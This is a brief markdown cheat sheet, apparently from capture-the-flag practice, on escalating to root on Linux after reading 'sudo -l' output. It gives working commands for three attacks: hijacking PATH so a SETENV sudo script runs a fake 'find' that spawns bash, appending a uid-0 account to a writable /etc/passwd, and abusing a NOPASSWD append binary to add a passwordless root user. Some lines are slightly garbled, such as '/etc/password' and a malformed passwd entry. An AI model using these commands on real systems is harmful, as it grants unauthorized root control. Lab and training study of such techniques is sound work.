# sudo -l 

## Case 1 - 

```
$sudo -l 

Matching Defaults entries for wizard on pb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on pb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```
-----------------------------------------------------

If we see a SETENV in that case we need to - 

    a. cat the file /opt/cleanup.sh
    b. see which command in that doesnot have an absolute path set
    c. In our case, find didn't have an absolute path set.
    d. make an executable file in /tmp named find.  -- echo "bash" > /tmp/find && chmod +x /tmp/find
    e. Now set the PATH environment variable to /tmp and also execute the cleanup.sh script to priv esc
        
         sudo PATH=/tmp:$PATH /opt/cleanup.sh

-----------------------------------------------------       

if you have read/write access to /etc/passwd you can:
    ```
    openssl passwd whateverPasswordYouWant
    echo "myUser:hashFromAboveCommand:0:0:root:/root:/bin/bash" >> /etc/passwd
    su myUser
    ```
         
## Case 2
```
$sudo -l 
Matching Defaults entries for charles on dc-4:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on dc-4:
    (root) NOPASSWD: /usr/bin/teehee
```
In this case this binary can be used to append text to a file
```
a. So we used the binary to add a root user to the /etc/password file with no password
        teehee -a /etc/passwd
       anindya:0:0:root:/root:/bin/bash

b. Then switch user to become root
        su anindya
```
